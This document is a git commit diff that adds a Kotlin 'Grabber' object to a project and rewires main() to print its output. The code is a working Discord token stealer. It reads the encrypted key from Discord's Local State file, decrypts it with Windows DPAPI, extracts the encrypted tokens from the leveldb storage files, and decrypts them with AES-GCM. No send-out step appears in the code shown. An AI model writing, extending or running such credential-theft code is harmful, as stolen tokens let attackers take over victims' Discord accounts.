0ee2aa4b653a67519f0317fc479f34cb9a51a35a
BuildTools <skywarspanel@gmail.com>
2024-03-12 13:00:18 +0100

    Finish, add depends, cleaning soon

---
+++ src/Grabber.kt
@@ -0,0 +1,71 @@
+import com.sun.jna.platform.win32.Crypt32Util
+import org.json.JSONObject
+import java.io.BufferedReader
+import java.io.File
+import java.io.FileReader
+import java.util.*
+import javax.crypto.Cipher
+import javax.crypto.spec.GCMParameterSpec
+import javax.crypto.spec.SecretKeySpec
+
+object Grabber {
+
+    fun getTokens(): List<String>? {
+        val key = getKey()
+        val tokens = getTokensFromFile()
+        if (key == null || tokens == null) return null
+        val decryptedTokens = LinkedList<String>()
+        for (s in tokens) {
+            try {
+                val z = Base64.getDecoder().decode(key)
+                val y = z.copyOfRange(5, z.size)
+                decryptedTokens.add(decrypt(Base64.getDecoder().decode(s), y))
+            } catch (e: Exception) {
+                // Handle exception
+            }
+        }
+        return decryptedTokens
+    }
+
+    private fun getTokensFromFile(): List<String>? {
+        val token = LinkedList<String>()
+        val regex = "dQw4w9WgXcQ:"
+        val files = File("${System.getenv("APPDATA")}\\discord\\Local Storage\\leveldb\\").listFiles()
+        files?.forEach { file ->
+            try {
+                BufferedReader(FileReader(file)).use { br ->
+                    var line: String?
+                    while (br.readLine().also { line = it } != null) {
+                        if (line!!.contains(regex)) token.add(line!!.split(regex)[1].split("\"")[0])
+                    }
+                }
+            } catch (e: Exception) {
+                // Handle exception
+            }
+        }
+        return token
+    }
+
+    private fun getKey(): String? {
+        try {
+            BufferedReader(FileReader(File("${System.getenv("APPDATA")}\\discord\\Local State"))).use { brs ->
+                var line: String?
+                while (brs.readLine().also { line = it } != null) {
+                    return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
+                }
+            }
+        } catch (e: Exception) {
+            // Handle exception
+        }
+        return null
+    }
+
+    private fun decrypt(token: ByteArray, key: ByteArray): String {
+        val finalKey = Crypt32Util.cryptUnprotectData(key)
+        val finalToken = ByteArray(12) { i -> token[i + 3] }
+        val data = ByteArray(token.size - 15) { i -> token[i + 15] }
+        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(finalKey, "AES"), GCMParameterSpec(128, finalToken))
+        return String(cipher.doFinal(data))
+    }
+}
--- src/Main.kt
+++ src/Main.kt
@@ -1,23 +1,3 @@
-import java.io.*
-import java.util.regex.Pattern
-
 fun main() {
-    if (!(System.getProperty("os.name").contains("Windows"))) {
-        println(System.getProperty("os.name"))
-        return
-    }
-
-    val regex = "dQw4w9WgXcQ:"
-    val files = File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\").listFiles()
-    for (file in files!!) {
-        BufferedReader(FileReader(file)).use { br ->
-            var line: String?
-            while (br.readLine().also { line = it } != null) {
-                if (line!!.contains(regex)) {
-                    println(line!!.split(regex)[1].split("\"")[0])
-                }
-            }
-        }
-    }
-    }
+    println(Grabber.getTokens())
 }
